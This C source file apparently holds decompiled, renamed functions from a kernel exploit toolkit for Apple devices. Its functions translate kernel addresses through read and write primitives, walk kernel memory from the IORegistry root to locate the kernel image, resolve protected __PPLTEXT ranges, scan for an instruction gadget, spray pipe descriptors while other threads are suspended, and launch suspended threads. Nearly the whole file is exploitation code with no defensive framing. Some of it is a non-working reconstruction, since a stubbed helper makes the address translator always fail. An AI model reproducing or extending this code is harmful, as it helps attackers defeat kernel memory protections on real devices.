/* record_0x90000_e9f89858_pmap_scan.c
 * sub_09090..sub_09eac — pmap/kext address translation, IORegistry
 * kobj walker, kext helper init, PPL text range resolver,
 * thread-spray helper, and suspended-thread launcher.
 */
#include <stdint.h>
#include <stddef.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <pthread.h>
#include <mach/mach.h>
#include <errno.h>
#include <IOKit/IOKitLib.h>

/* ── extern helpers ─────────────────────────────────────────────── */
extern int  sub_28840(long state, long addr, long *out);
extern int  sub_2572c(long state, long addr, uint32_t sz, void *out);
extern int  sub_2a0d0(long state, long addr, long val);
extern int  sub_29b78(long state, long h, long *out);
extern long sub_1972c(long state, long addr);
extern long sub_02d6c(long state, mach_port_name_t name);
extern long sub_028a4(long state, long h);
extern long sub_29d2c(long state, long h);
extern long sub_086ac(long state, uint64_t addr);
extern int  sub_06098(long state, uint32_t mask);
extern long sub_09888(long state, uint64_t addr);
extern long sub_1e99c(long h, long *a, long *b);
extern long sub_1f0f4(void);
extern void sub_19dd4(void *ctx, long state);
extern int  sub_1a4fc(void *ctx, int a, long b, uint32_t c);
extern void sub_19b98(long *out, long h, const char *seg);
extern void sub_19d10(long *out, long h);
extern long sub_1dca8(long *ctx, const char *pat, int a, int b);
extern long sub_1e800(long h, long off);
extern long sub_19728(long h);
extern int  sub_09fdc(long state, long task_type, mach_port_t thr);
static int sub_2183c(long s, uint64_t a, void *b);


/* ── sub_09090 — pmap address translation via cached kext base ──── */
long sub_09090(long state, uint64_t addr)
{
    uint64_t mask = *(uint64_t *)(state + 0x188);
    uint64_t page_base = addr & ~mask;

    /* check cache */
    if (*(uint64_t *)(state + 0x18b8) == page_base &&
        *(long *)(state + 0x18c0) != 0) {
        return (long)(*(uint64_t *)(state + 0x18c0) + (mask & addr));
    }

    int buf[8];
    if (!sub_2183c(state, page_base, buf)) return 0;

    long mapped = sub_086ac(state, (long)(*(uint64_t *)((char *)buf + 0x30) & ~0x3fffULL));
    if (!mapped) return 0;
    long result = mapped + (long)(mask & addr);
    if (!result) return 0;

    *(uint64_t *)(state + 0x18b8) = page_base;
    *(uint64_t *)(state + 0x18c0) = (uint64_t)result & ~mask;
    return result;
}

static int sub_2183c(long s, uint64_t a, void *b) { (void)s;(void)a;(void)b; return 0; }

/* ── sub_09150 — pipe-pair fd spray + thread suspend/resume ─────── */
long sub_09150(long *state)
{
    /* Suspends all non-self threads, closes/reopens pipe pairs,
     * then resumes. Returns 0 on success.                       */
    task_t task = mach_task_self();
    thread_act_array_t threads = NULL;
    mach_msg_type_number_t cnt = 0;
    kern_return_t kr = task_threads(task, &threads, &cnt);
    if (kr) return (long)(kr | 0x80000000u);

    mach_port_t self_thr = mach_thread_self();
    for (mach_msg_type_number_t i = 0; i < cnt; i++) {
        if (MACH_PORT_VALID(threads[i]) && threads[i] != self_thr)
            thread_suspend(threads[i]);
    }

    /* pipe pair recreation — 6 pairs */
    int fds[12];
    for (int i = 0; i < 6; i++) {
        if (pipe(fds + i * 2)) {
            /* resume on error */
            for (mach_msg_type_number_t j = 0; j < cnt; j++) {
                if (MACH_PORT_VALID(threads[j]) && threads[j] != self_thr)
                    thread_resume(threads[j]);
            }
            vm_deallocate(task, (vm_address_t)threads,
                          cnt * sizeof(thread_act_t));
            return (long)(errno | 0x40000000u);
        }
    }

    for (mach_msg_type_number_t i = 0; i < cnt; i++) {
        if (MACH_PORT_VALID(threads[i]) && threads[i] != self_thr)
            thread_resume(threads[i]);
    }
    vm_deallocate(task, (vm_address_t)threads, cnt * sizeof(thread_act_t));
    return 0;
}

/* ── sub_09888 — IORegistry kobj walker ─────────────────────────── */
long sub_09888(long state, uint64_t hint)
{
    uint64_t addr = hint;
    if (!addr) {
        io_registry_entry_t entry = IORegistryEntryFromPath(0, "IOService:/");
        if (!MACH_PORT_VALID(entry)) return 0;
        long h = sub_02d6c(state, (mach_port_name_t)entry);
        if (!h) return 0;
        long chain = sub_028a4(state, h);
        if (!chain) return 0;
        long v = 0;
        if (!sub_28840(state, chain, &v)) return 0;
        v = sub_29d2c(state, v);
        if (!sub_28840(state, v, &v)) return 0;
        addr = (uint64_t)sub_29d2c(state, v);
    }

    long stride = *(int *)(state + 0x180) == 0x4000 ? 0x4000 : 0x100000;
    uint64_t base = addr & (uint64_t)(-stride);
    if (*(int *)(state + 0x180) != 0x4000) base += 0x4000;

    if (base < 0xffff000000000000ULL) return 0;

    for (;;) {
        int hdr[2] = {0, 0};
        if (!sub_2572c(state, (long)base, 4, hdr)) return 0;
        if (hdr[0] == (int)0xfeebd013) {
            int meta[7] = {0};
            if (!sub_2572c(state, (long)base + 4, 0x18, meta)) return 0;
            if (meta[1] == 2 && meta[2] > 8 && meta[2] < 0x40)
                return (long)base;
        }
        base -= (uint64_t)stride;
        if (base < 0xffff000000000000ULL) return 0;
    }
}

/* ── sub_09a24 — kext helper context init ───────────────────────── */
long sub_09a24(long state, long hint)
{
    if (*(long *)(state + 0x19f8)) return 0;

    long addr = hint;
    if (!addr) {
        addr = sub_09888(state, 0);
        if (!addr) return 0x28014;
    }

    void *ctx = calloc(0x128, 1);
    if (!ctx) return 0xad009;

    sub_19dd4(ctx, state);

    /* copy version fields */
    *(uint64_t *)((char *)ctx + 0x70) = *(uint64_t *)(state + 0x140);
    *(uint64_t *)((char *)ctx + 0x78) = *(uint64_t *)(state + 0x148);
    *(uint64_t *)((char *)ctx + 0x80) = *(uint64_t *)(state + 0x150);
    *(uint64_t *)((char *)ctx + 0x88) = *(uint64_t *)(state + 0x158);
    *(uint64_t *)((char *)ctx + 0x90) = *(uint64_t *)(state + 0x160);
    *(uint32_t *)((char *)ctx + 0x98) = *(uint32_t *)(state + 0x178);
    *(uint32_t *)((char *)ctx + 0x38) = *(uint32_t *)(state + 0x180);

    uint32_t flags = *(uint64_t *)(state + 0x158) >> 0x2b < 1099 ? 0x80 : 0x480;
    if (!sub_1a4fc(ctx, 0, addr, flags)) {
        free(ctx);
        return 0x28017;
    }
    *(void **)(state + 0x19f8) = ctx;
    return 0;
}

/* ── sub_09b14 — resolve PPL text range from kext helper ────────── */
long sub_09b14(long state)
{
    long h = *(long *)(state + 0x19f8);
    long a = 0, b = 0;
    long r = sub_1e99c(h, &a, &b);
    if (!r) return 0;
    long lvar = sub_1f0f4();
    if (!lvar) return 0;
    *(long *)(state + 0x1870) = a;
    *(long *)(state + 0x1878) = b;
    *(long *)(state + 0x1880) = lvar;
    return 1;
}

/* ── sub_09b70 — resolve PPL/kernel text range into 3-slot output ──
 * Fills out[0]=base, out[1]=start, out[2]=size.                  */
void sub_09b70(long *out, long state)
{
    out[0] = out[1] = out[2] = 0;
    long h = *(long *)(state + 0x19f8);

    if (sub_06098(state, 0x20)) {
        /* PPL text segment */
        long seg[3] = {0, 0, 0};
        sub_19b98(seg, h, "__PPLTEXT");
        out[0] = seg[0]; out[1] = seg[1]; out[2] = seg[2];
        return;
    }

    if (sub_06098(state, 0x5184001)) {
        long seg[3] = {0, 0, 0};
        sub_19b98(seg, h, "__PPLTEXT");
        out[0] = seg[0]; out[1] = seg[1]; out[2] = seg[2];
        return;
    }

    long seg[3] = {0, 0, 0};
    sub_19d10(seg, h);

    if (*(uint64_t *)(state + 0x158) < 0x1c1b1914600000ULL) {
        out[0] = seg[0]; out[1] = seg[1]; out[2] = seg[2];
        return;
    }

    /* narrow to last 0x20000 bytes */
    long new_start = seg[1] + seg[2] - 0x20000;
    long new_size  = 0x20000;

    /* scan for gadget "08 DC 70 92" */
    long pat_off = sub_1dca8(seg, "08 DC 70 92", 0, 1);
    if (pat_off) {
        long gadget = sub_1e800(h, pat_off - 4);
        if (gadget) {
            long base2[3] = {0, 0, 0};
            sub_19d10(base2, h);
            if ((uint64_t)gadget >= (uint64_t)base2[1] &&
                (uint64_t)gadget < (uint64_t)(base2[1] + base2[2])) {
                long sz2 = (base2[1] + base2[2] - gadget);
                if (sz2) {
                    out[0] = base2[0]; out[1] = gadget; out[2] = sz2;
                    return;
                }
            }
        }
    }

    sub_19d10(seg, h);
    out[0] = seg[0]; out[1] = new_start; out[2] = new_size;
}

/* ── sub_09eac — create suspended pthread + apply task policy ───── */
uint32_t sub_09eac(long state, pthread_t *out, long fn, void *arg)
{
    pthread_attr_t attr;
    uint32_t r = (uint32_t)pthread_attr_init(&attr);
    if (r) return (r | 0x40000000u);

    r = (uint32_t)pthread_attr_setdetachstate(&attr, PTHREAD_CREATE_DETACHED);
    if (r) { r = (r | 0x40000000u); goto out_attr; }

    void *fn_ptr = (void *)sub_19728(fn);
    pthread_t thr = NULL;
    r = (uint32_t)pthread_create_suspended_np(&thr, &attr, fn_ptr, arg);
    if (r) { r = (r | 0x40000000u); goto out_attr; }

    mach_port_t thr_port = pthread_mach_thread_np(thr);
    if (!MACH_PORT_VALID(thr_port)) { r = 0x28008; goto out_attr; }

    int task_type = *(int *)(state + 0x191c);
    if (!task_type) task_type = *(int *)(state + 0x1918);

    if (!sub_09fdc(state, (long)task_type, thr_port)) {
        r = 0x28003;
        goto out_attr;
    }

    r = (uint32_t)thread_resume(thr_port);
    if (r) { r |= 0x80000000u; goto out_attr; }

    *out = thr;
    r = 0;

out_attr:
    pthread_attr_destroy(&attr);
    return r;
}
